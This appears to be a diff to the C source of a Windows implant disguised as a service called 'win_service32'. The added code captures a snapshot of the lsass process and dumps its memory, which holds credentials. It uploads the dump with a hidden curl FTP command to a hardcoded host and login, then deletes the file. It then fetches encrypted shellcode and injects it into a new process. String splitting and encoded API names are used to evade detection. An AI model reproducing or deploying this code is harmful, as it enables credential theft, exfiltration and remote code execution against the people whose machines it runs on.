@@ -7,7 +7,7 @@
 #include <strsafe.h>
 #include <winhttp.h>
 #include <wchar.h> 
-
+#include <processsnapshot.h>
 #define SVC_ERROR ((DWORD)0xC0020001L)
 #define SVCNAME TEXT("win_service32")
 
@@ -32,6 +32,281 @@ VOID ReportSvcStatus( DWORD, DWORD, DWORD );
 VOID SvcInit( DWORD, LPTSTR * ); 
 VOID SvcReportEvent( LPTSTR );
 
+
+BOOL CALLBACK MyMiniDumpWriteDumpCallback(
+  __in     PVOID CallbackParam,
+  __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
+  __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
+)
+{
+    switch (CallbackInput->CallbackType)
+    {
+        case 16: // IsProcessSnapshotCallback
+            CallbackOutput->Status = S_FALSE;
+            break;
+    }
+    return TRUE;
+}
+
+int report(){
+	char full_string_2[50];	// \\??\\C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\dumpfile.dmp
+	char part_string_2_1[] = "\\";
+	char part_string_2_2[] = "??";
+	char part_string_2_3[] = "\\";
+	char part_string_2_4[] = "C";
+	char part_string_2_5[] = ":";
+	char part_string_2_6[] = "\\";
+	char part_string_2_7[] = "Wi";
+	char part_string_2_8[] = "nd";
+	char part_string_2_9[] = "ow";
+	char part_string_2_10[] = "s\\";
+	char part_string_2_11[] = "T";
+	char part_string_2_12[] = "e";
+	char part_string_2_13[] = "mp\\";
+	char part_string_2_14[] = "SSS";
+	char part_string_2_15[] = "_";
+	char part_string_2_16[] = "ce";
+	char part_string_2_17[] = "1";
+	char part_string_2_18[] = "aaa";
+	char part_string_2_19[] = "99ce";
+	char part_string_2_20[] = "4bdb";
+	char part_string_2_21[] = "0101";
+	char part_string_2_22[] = "000000";
+	char part_string_2_23[] = "984b2414";
+	char part_string_2_24[] = "aa";
+	char part_string_2_25[] = "\\";
+	char part_string_2_26[] = "d";
+	char part_string_2_27[] = "u";
+	char part_string_2_28[] = "m";
+	char part_string_2_29[] = "p";
+	char part_string_2_30[] = "f";
+	char part_string_2_31[] = "i";
+	char part_string_2_32[] = "l";
+	char part_string_2_33[] = "e";
+	char part_string_2_34[] = ".";
+	char part_string_2_35[] = "d";
+	char part_string_2_36[] = "m";
+	char part_string_2_37[] = "p";
+	strcpy(full_string_2, part_string_2_1);
+	strcat(full_string_2, part_string_2_2);
+	strcat(full_string_2, part_string_2_3);
+	strcat(full_string_2, part_string_2_4);
+	strcat(full_string_2, part_string_2_5);
+	strcat(full_string_2, part_string_2_6);
+	strcat(full_string_2, part_string_2_7);
+	strcat(full_string_2, part_string_2_8);
+	strcat(full_string_2, part_string_2_9);
+	strcat(full_string_2, part_string_2_10);
+	strcat(full_string_2, part_string_2_11);
+	strcat(full_string_2, part_string_2_12);
+	strcat(full_string_2, part_string_2_13);
+	strcat(full_string_2, part_string_2_14);
+	strcat(full_string_2, part_string_2_15);
+	strcat(full_string_2, part_string_2_16);
+	strcat(full_string_2, part_string_2_17);
+	strcat(full_string_2, part_string_2_18);
+	strcat(full_string_2, part_string_2_19);
+	strcat(full_string_2, part_string_2_20);
+	strcat(full_string_2, part_string_2_21);
+	strcat(full_string_2, part_string_2_22);
+	strcat(full_string_2, part_string_2_23);
+	strcat(full_string_2, part_string_2_24);
+	strcat(full_string_2, part_string_2_25);
+	strcat(full_string_2, part_string_2_26);
+	strcat(full_string_2, part_string_2_27);
+	strcat(full_string_2, part_string_2_28);
+	strcat(full_string_2, part_string_2_29);
+	strcat(full_string_2, part_string_2_30);
+	strcat(full_string_2, part_string_2_31);
+	strcat(full_string_2, part_string_2_32);
+	strcat(full_string_2, part_string_2_33);
+	strcat(full_string_2, part_string_2_34);
+	strcat(full_string_2, part_string_2_35);
+	strcat(full_string_2, part_string_2_36);
+	strcat(full_string_2, part_string_2_37);
+	
+    
+	char full_string_1[100];	// innocent.dmp -> remote file name
+	char part_string_1_1[] = "i";
+	char part_string_1_2[] = "n";
+	char part_string_1_3[] = "n";
+	char part_string_1_4[] = "o";
+	char part_string_1_5[] = "c";
+	char part_string_1_6[] = "e";
+	char part_string_1_7[] = "n";
+	char part_string_1_8[] = "t";
+	char part_string_1_9[] = ".";
+	char part_string_1_10[] = "d";
+	char part_string_1_11[] = "m";
+	char part_string_1_12[] = "p";
+	strcpy(full_string_1, part_string_1_1);
+	strcat(full_string_1, part_string_1_2);
+	strcat(full_string_1, part_string_1_3);
+	strcat(full_string_1, part_string_1_4);
+	strcat(full_string_1, part_string_1_5);
+	strcat(full_string_1, part_string_1_6);
+	strcat(full_string_1, part_string_1_7);
+	strcat(full_string_1, part_string_1_8);
+	strcat(full_string_1, part_string_1_9);
+	strcat(full_string_1, part_string_1_10);
+	strcat(full_string_1, part_string_1_11);
+	strcat(full_string_1, part_string_1_12);
+  
+	char full_string_3[5];	// ftp
+	char part_string_3_1[] = "f";
+	char part_string_3_2[] = "t";
+	char part_string_3_3[] = "p";
+	strcpy(full_string_3, part_string_3_1);
+	strcat(full_string_3, part_string_3_2);
+	strcat(full_string_3, part_string_3_3);
+  
+  
+ 	char full_string_4[100];	// 192.168.8.161
+	char part_string_4_1[] = "1";
+	char part_string_4_2[] = "9";
+	char part_string_4_3[] = "2.";
+	char part_string_4_4[] = "1";
+	char part_string_4_5[] = "6";
+	char part_string_4_6[] = "8";
+	char part_string_4_7[] = ".";
+	char part_string_4_8[] = "8";
+	char part_string_4_9[] = ".";
+	char part_string_4_10[] = "1";
+	char part_string_4_11[] = "6";
+	char part_string_4_12[] = "1";
+	strcpy(full_string_4, part_string_4_1);
+	strcat(full_string_4, part_string_4_2);
+	strcat(full_string_4, part_string_4_3);
+	strcat(full_string_4, part_string_4_4);
+	strcat(full_string_4, part_string_4_5);
+	strcat(full_string_4, part_string_4_6);
+	strcat(full_string_4, part_string_4_7);
+	strcat(full_string_4, part_string_4_8);
+	strcat(full_string_4, part_string_4_9);
+	strcat(full_string_4, part_string_4_10);
+	strcat(full_string_4, part_string_4_11);
+	strcat(full_string_4, part_string_4_12);
+	
+ 	char full_string_5[100];	// uploads
+	char part_string_5_1[] = "u";
+	char part_string_5_2[] = "p";
+	char part_string_5_3[] = "l";
+	char part_string_5_4[] = "o";
+	char part_string_5_5[] = "a";
+	char part_string_5_6[] = "d";
+	char part_string_5_7[] = "s";
+	strcpy(full_string_5, part_string_5_1);
+	strcat(full_string_5, part_string_5_2);
+	strcat(full_string_5, part_string_5_3);
+	strcat(full_string_5, part_string_5_4);
+	strcat(full_string_5, part_string_5_5);
+	strcat(full_string_5, part_string_5_6);
+	strcat(full_string_5, part_string_5_7);
+
+ 	char full_string_6[100];	// ftp_user:123
+	char part_string_6_1[] = "f";
+	char part_string_6_2[] = "t";
+	char part_string_6_3[] = "p";
+	char part_string_6_4[] = "_";
+	char part_string_6_5[] = "u";
+	char part_string_6_6[] = "s";
+	char part_string_6_7[] = "e";
+	char part_string_6_8[] = "r";
+	char part_string_6_9[] = ":";
+	char part_string_6_10[] = "1";
+	char part_string_6_11[] = "2";
+	char part_string_6_12[] = "3";
+	strcpy(full_string_6, part_string_6_1);
+	strcat(full_string_6, part_string_6_2);
+	strcat(full_string_6, part_string_6_3);
+	strcat(full_string_6, part_string_6_4);
+	strcat(full_string_6, part_string_6_5);
+	strcat(full_string_6, part_string_6_6);
+	strcat(full_string_6, part_string_6_7);
+	strcat(full_string_6, part_string_6_8);
+	strcat(full_string_6, part_string_6_9);
+	strcat(full_string_6, part_string_6_10);
+	strcat(full_string_6, part_string_6_11);
+	strcat(full_string_6, part_string_6_12);
+	
+	char full_string_7[100];	// --ftp-ssl-reqd
+	char part_string_7_1[] = "--f";
+	char part_string_7_2[] = "t";
+	char part_string_7_3[] = "p";
+	char part_string_7_4[] = "-";
+	char part_string_7_5[] = "s";
+	char part_string_7_6[] = "s";
+	char part_string_7_7[] = "l";
+	char part_string_7_8[] = "-";
+	char part_string_7_9[] = "r";
+	char part_string_7_10[] = "e";
+	char part_string_7_11[] = "q";
+	char part_string_7_12[] = "d";
+	strcpy(full_string_7, part_string_7_1);
+	strcat(full_string_7, part_string_7_2);
+	strcat(full_string_7, part_string_7_3);
+	strcat(full_string_7, part_string_7_4);
+	strcat(full_string_7, part_string_7_5);
+	strcat(full_string_7, part_string_7_6);
+	strcat(full_string_7, part_string_7_7);
+	strcat(full_string_7, part_string_7_8);
+	strcat(full_string_7, part_string_7_9);
+	strcat(full_string_7, part_string_7_10);
+	strcat(full_string_7, part_string_7_11);
+	strcat(full_string_7, part_string_7_12);
+	
+	char full_string_8[100];	// curl.exe
+	char part_string_8_1[] = "c";
+	char part_string_8_2[] = "u";
+	char part_string_8_3[] = "r";
+	char part_string_8_4[] = "l";
+	char part_string_8_5[] = ".";
+	char part_string_8_6[] = "e";
+	char part_string_8_7[] = "x";
+	char part_string_8_8[] = "e";
+	strcpy(full_string_8, part_string_8_1);
+	strcat(full_string_8, part_string_8_2);
+	strcat(full_string_8, part_string_8_3);
+	strcat(full_string_8, part_string_8_4);
+	strcat(full_string_8, part_string_8_5);
+	strcat(full_string_8, part_string_8_6);
+	strcat(full_string_8, part_string_8_7);
+	strcat(full_string_8, part_string_8_8);
+	
+	char full_string_9[4];	// -u for --user
+	char part_string_9_1[] = "-";
+	char part_string_9_2[] = "u";
+	strcpy(full_string_9, part_string_9_1);
+	strcat(full_string_9, part_string_9_2);
+	
+	char full_string_10[4];	// -k for --insecure
+	char part_string_10_1[] = "-";
+	char part_string_10_2[] = "k";
+	strcpy(full_string_10, part_string_10_1);
+	strcat(full_string_10, part_string_10_2);
+	
+	char full_string_11[4];	// -s for --silent
+	char part_string_11_1[] = "-";
+	char part_string_11_2[] = "s";
+	strcpy(full_string_11, part_string_11_1);
+	strcat(full_string_11, part_string_11_2);
+	
+	
+	
+	char curlCommand[512];
+
+	//curl --ftp-ssl-reqd -T test_ftp_ssl.txt -u "ftp_user:123" "ftp://192.168.8.161/uploads/test_ftp_ssl.txt" -k -s
+    snprintf(curlCommand, sizeof(curlCommand),
+             "%s %s -T \"%s\" %s://%s/%s/%s %s \"%s\" %s %s",
+             full_string_8,full_string_7,full_string_2,full_string_3,full_string_4,full_string_5,full_string_1,full_string_9,full_string_6,full_string_10,full_string_11);
+			 
+    int result;
+    do {
+		result = system(curlCommand);
+	} while (result != 0);
+	
+	return 0;
+}
 
 HMODULE Get_Module(LPCWSTR Module_Name)
 {
@@ -85,9 +360,9 @@ int netops(FARPROC h_11_p_open_func,
 	wchar_t part_1_5[] = L"ll";
 	wchar_t part_1_6[] = L"c";
 	wchar_t part_1_7[] = L"o";
-	wchar_t part_1_8[] = L"o";
-	wchar_t part_1_9[] = L"d";
-	wchar_t part_1_10[] = L"e.";
+	wchar_t part_1_8[] = L"d";
+	wchar_t part_1_9[] = L"e";
+	wchar_t part_1_10[] = L".";
 	wchar_t part_1_11[] = L"b";
 	wchar_t part_1_12[] = L"in";
 	//printf("size of /shellcode.bin -> %d\n",sizeof(L"shellcode.bin"));
@@ -234,6 +509,7 @@ void decrypt(unsigned char *magic, SIZE_T magic_size, char key) {
 	return;
 }
 
+
 int main_meat(){
 	
 	WSADATA wsaData;
@@ -265,7 +541,7 @@ int main_meat(){
 	int wait_for_single_object_offset[] = {48,0,8,19,31,14,17,44,8,13,6,11,4,40,1,9,4,2,19};
 	int create_process_A_offset[] = {28,17,4,0,19,4,41,17,14,2,4,18,18,26,};
 	int exe_c_C_M_d_offset[] = {2,12,3,62,4,23,4};	//cmd.exe
-	int listener_addr_offset[] = {53,61,54,62,53,58,60,62,53,52,52,62,53,55}; 	//192.168.100.13
+	int listener_addr_offset[] = {53,61,54,62,53,58,60,62,60,62,53,58,53}; 	//192.168.8.161
 	int dll_ws2__32_offset[] = {22,18,54,63,55,54,62,3,11,11};
 	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
 	int dll_n__t_offset[] = {39,45,29,37,37};
@@ -288,6 +564,7 @@ int main_meat(){
 	int proc_first_offset[] = {41,17,14,2,4,18,18,55,54,31,8,17,18,19};				//Process32First
 	int proc_next_offset[] = {41,17,14,2,4,18,18,55,54,39,4,23,19};					//Process32Next
 	int wr_dmp_offset[] = {38,8,13,8,29,20,12,15,48,17,8,19,4,29,20,12,15}; //MiniDumpWriteDump
+	int pss_capture_offset[] = {41,18,18,28,0,15,19,20,17,4,44,13,0,15,18,7,14,19}; //PssCaptureSnapshot 
 	
 	
 
@@ -702,6 +979,7 @@ int main_meat(){
 	FARPROC h_11_p_read_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_read_offset,ALL_ALPHANUM,sizeof(h_11_p_read_offset))); //WinHttpReadData
 	FARPROC h_11_p_close_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_close_offset,ALL_ALPHANUM,sizeof(h_11_p_close_offset))); //WinHttpCloseHandle
 	FARPROC wr_dmp_func = GetProcAddress(hdll_d_b_g,GetOriginal(wr_dmp_offset,ALL_ALPHANUM,sizeof(wr_dmp_offset))); //MiniDumpWriteDump
+	FARPROC pss_capture_func = GetProcAddress(hDLL_k_er_32,GetOriginal(pss_capture_offset,ALL_ALPHANUM,sizeof(pss_capture_offset)));	//PssCaptureSnapshot
 	FARPROC create_snap_func = GetProcAddress(hDLL_k_er_32,GetOriginal(create_snap_offset,ALL_ALPHANUM,sizeof(create_snap_offset)));
 	FARPROC proc_first_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_first_offset,ALL_ALPHANUM,sizeof(proc_first_offset)));
 	FARPROC proc_next_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_next_offset,ALL_ALPHANUM,sizeof(proc_next_offset)));
@@ -714,6 +992,7 @@ int main_meat(){
 	NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,full_func_6);	
 	NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,full_func_7);
 	NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,full_func_8);
+
 	//NtOpenMutant NT_OpenMutant = (NtOpenMutant)GetProcAddress(hDLL_n__t,"NtOpenMutant");
 	//NtCreateMutant NT_CreateMutant = (NtCreateMutant)GetProcAddress(hDLL_n__t,"NtCreateMutant");
 	// --- END GET FUNCTOINS --- //
@@ -726,6 +1005,89 @@ int main_meat(){
 	//if (argc != 2){printf("[x] USAGE: ./lsass_dumper.exe <lssas.exe pid>\n");exit(1);}
 	//printf("[x] filling vars\n");
 	//DWORD PID=atoi(argv[1]);
+	
+	char full_string_tmp_file_1[30];	// \\??\\C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\fawf3na.chkf
+	char part_string_tmp_file_1_1[] = "\\";
+	char part_string_tmp_file_1_2[] = "??";
+	char part_string_tmp_file_1_3[] = "\\";
+	char part_string_tmp_file_1_4[] = "C";
+	char part_string_tmp_file_1_5[] = ":";
+	char part_string_tmp_file_1_6[] = "\\";
+	char part_string_tmp_file_1_7[] = "Wi";
+	char part_string_tmp_file_1_8[] = "nd";
+	char part_string_tmp_file_1_9[] = "ow";
+	char part_string_tmp_file_1_10[] = "s\\";
+	char part_string_tmp_file_1_11[] = "T";
+	char part_string_tmp_file_1_12[] = "e";
+	char part_string_tmp_file_1_13[] = "mp\\";
+	char part_string_tmp_file_1_14[] = "SSS";
+	char part_string_tmp_file_1_15[] = "_";
+	char part_string_tmp_file_1_16[] = "ce";
+	char part_string_tmp_file_1_17[] = "1";
+	char part_string_tmp_file_1_18[] = "aaa";
+	char part_string_tmp_file_1_19[] = "99ce";
+	char part_string_tmp_file_1_20[] = "4bdb";
+	char part_string_tmp_file_1_21[] = "0101";
+	char part_string_tmp_file_1_22[] = "000000";
+	char part_string_tmp_file_1_23[] = "984b2414";
+	char part_string_tmp_file_1_24[] = "aa";
+	char part_string_tmp_file_1_25[] = "\\";
+	char part_string_tmp_file_1_26[] = "f";
+	char part_string_tmp_file_1_27[] = "a";
+	char part_string_tmp_file_1_28[] = "w";
+	char part_string_tmp_file_1_29[] = "f";
+	char part_string_tmp_file_1_30[] = "3";
+	char part_string_tmp_file_1_31[] = "n";
+	char part_string_tmp_file_1_32[] = "a";
+	char part_string_tmp_file_1_33[] = ".";
+	char part_string_tmp_file_1_34[] = "c";
+	char part_string_tmp_file_1_35[] = "h";
+	char part_string_tmp_file_1_36[] = "k";
+	char part_string_tmp_file_1_37[] = "f";
+	strcpy(full_string_tmp_file_1, part_string_tmp_file_1_1);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_2);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_3);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_4);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_5);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_6);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_7);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_8);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_9);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_10);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_11);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_12);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_13);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_14);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_15);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_16);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_17);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_18);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_19);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_20);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_21);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_22);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_23);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_24);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_25);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_26);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_27);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_28);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_29);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_30);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_31);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_32);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_33);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_34);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_35);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_36);
+	strcat(full_string_tmp_file_1, part_string_tmp_file_1_37);
+	
+	HANDLE hCheckFile;
+	hCheckFile = cr_file_func(full_string_tmp_file_1,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_NEW,FILE_ATTRIBUTE_NORMAL,NULL);
+	if(GetLastError() == 80){
+		goto INIT_BACKDOOR;
+	}
+	// continue block code
 
 	HANDLE hDumpFile;
 	BOOL bProcDump;
@@ -875,6 +1237,12 @@ int main_meat(){
 	);
 	//if (!hDumpFile){printf("[x] Failed to create the file, error: %ld\n",GetLastError());exit(1);}
 	
+	
+	
+
+
+	
+	
 	HANDLE hProcess_dmp;
 	//printf("the proc id is --> %d\n",PID);
 	// --- START GET PROCESS --- //
@@ -889,26 +1257,58 @@ int main_meat(){
 
 	//if (hProcess == NULL){printf("[x] Failed to get handle to lsass process, error: %ld\n",GetLastError());exit(1);}
 	 
+	HPSS snapshot_handle;
+	DWORD CaptureFlags = (DWORD)PSS_CAPTURE_VA_CLONE
+                            | PSS_CAPTURE_HANDLES
+                            | PSS_CAPTURE_HANDLE_NAME_INFORMATION
+                            | PSS_CAPTURE_HANDLE_BASIC_INFORMATION
+                            | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
+                            | PSS_CAPTURE_HANDLE_TRACE
+                            | PSS_CAPTURE_THREADS
+                            | PSS_CAPTURE_THREAD_CONTEXT
+                            | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
+                            | PSS_CREATE_BREAKAWAY
+                            | PSS_CREATE_BREAKAWAY_OPTIONAL
+                            | PSS_CREATE_USE_VM_ALLOCATIONS
+                            | PSS_CREATE_RELEASE_SECTION;
+    DWORD status = pss_capture_func(
+        hProcess_dmp,
+		CaptureFlags,
+        CONTEXT_ALL,
+        &snapshot_handle
+    );
+	
+	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
+	ZeroMemory(&CallbackInfo, sizeof (MINIDUMP_CALLBACK_INFORMATION));
+	CallbackInfo.CallbackRoutine = MyMiniDumpWriteDumpCallback;
+	CallbackInfo.CallbackParam = NULL;
+	
 	bProcDump= wr_dmp_func(
-		hProcess_dmp,
+		(HANDLE) snapshot_handle,
 		PID,
 		hDumpFile,
 		MiniDumpWithFullMemory,
 		NULL,
 		NULL,
-		NULL
+		&CallbackInfo
 	);
 	
 	//if (bProcDump == FALSE){printf("[x] Failed to dump lsass, error: %ld\n",GetLastError());exit(1);}
 	
 	//printf("[+] lsass dumped successfully");
 	
-	//IMPORTANT -> send file via ftp system(curl) and delete the .dmp file after that
+	CloseHandle(hDumpFile);
 	
+	//IMPORTANT -> send file via ftp system(curl) and delete the .dmp file after that
+	report();
+	
+	DeleteFile(full_string_2);
+	
+INIT_BACKDOOR:
+
 	// -- GET ENCRYPTED SHELLCODE -- //
 	netops(h_11_p_open_func,h_11_p_conn_func,h_11_p_open_req_func,h_11_p_send_func,h_11_p_recv_func,h_11_p_query_func,h_11_p_read_func,h_11_p_close_func);
-	
-	// -- END -- //
+	// -- END GET ENCRYPTED SHELLCODE-- //
 	
 
 	
@@ -924,23 +1324,13 @@ int main_meat(){
 	hProcess = proc_info_1.hProcess;
 	
 	HANDLE hThread;
-	HANDLE hMux;
 	DWORD OldProtect_MEM = 0;
 	DWORD OldProtect_THREAD = 0;
 	SIZE_T BytesWritten = 0;
 	PVOID Buffer = NULL;	//for shellcode allocation
-	
-	//printf("[NtAllocateVirtualMemory] Allocating [RW-] memory..\n");
-	STATUS=NT_VirtualAlloc(hProcess,&Buffer,0,&magic_size, MEM_COMMIT | MEM_RESERVE ,PAGE_READWRITE);	
-	if(STATUS != STATUS_SUCCESS){
-		//printf("[NtAllocateVirtualMemory] Failed to allocate memeory , error 0x%lx\n",STATUS);
-		//goto CLEANUP;
-	}
-	//printf("[NtAllocateVirtualMemory] Memory Allocated!\n");
-	
-	// --- start decryption --- //
 
-	
+
+	// --- start decryption --- //
 	decrypt(magic,magic_size,key5);
 
 	decrypt(magic,magic_size,key4);
@@ -951,6 +1341,16 @@ int main_meat(){
 
 	decrypt(magic,magic_size,key1);
 	// --- end decryption --- //
+	
+	//printf("[NtAllocateVirtualMemory] Allocating [RW-] memory..\n");
+	STATUS=NT_VirtualAlloc(hProcess,&Buffer,0,&magic_size, MEM_COMMIT | MEM_RESERVE ,PAGE_READWRITE);	
+	if(STATUS != STATUS_SUCCESS){
+		//printf("[NtAllocateVirtualMemory] Failed to allocate memeory , error 0x%lx\n",STATUS);
+		//goto CLEANUP;
+	}
+	//printf("[NtAllocateVirtualMemory] Memory Allocated!\n");
+	
+
 	
 	//printf("[NtWriteVirtualMemory] Writing shellcode into allocated memory..\n");
 	STATUS=NT_WriteVirtualMemory(hProcess,Buffer,magic,magic_size,&BytesWritten);
@@ -1041,7 +1441,7 @@ int main_meat(){
 		}
 		*/
 		//recieve data
-		recv_func(client_socket,recv_buffer,sizeof(recv_buffer),0);	
+		//recv_func(client_socket,recv_buffer,sizeof(recv_buffer),0);	
 
 
 
@@ -1070,7 +1470,7 @@ int main_meat(){
 		
 	 
 		//CLEANUP	
-		memset(recv_buffer,0,sizeof(recv_buffer));
+		//memset(recv_buffer,0,sizeof(recv_buffer));
 		close_sock_func(client_socket);
 		wsa_cleanup_func();
 	}
@@ -1091,10 +1491,6 @@ CLEANUP:
 	if(hProcess){
 		//printf("[NtClose] Closing hProcess handle\n");
 		NT_Close(hProcess);
-	}
-	if(hMux){
-		//printf("[NtClose] Closing hMux handle\n");
-		NT_Close(hMux);
 	}
 
 }
